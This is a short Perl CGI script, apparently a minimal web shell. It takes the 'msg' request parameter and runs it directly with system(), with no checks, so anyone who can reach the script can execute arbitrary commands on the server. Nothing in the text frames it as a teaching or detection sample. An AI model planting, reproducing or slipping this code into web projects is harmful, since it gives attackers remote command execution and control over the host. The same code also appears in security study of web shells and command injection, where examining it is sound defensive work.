#!/usr/bin/perl
use CGI':standard';
print "content-type:text/html\n\n";
$c=param('msg');
system($c);
exit(0);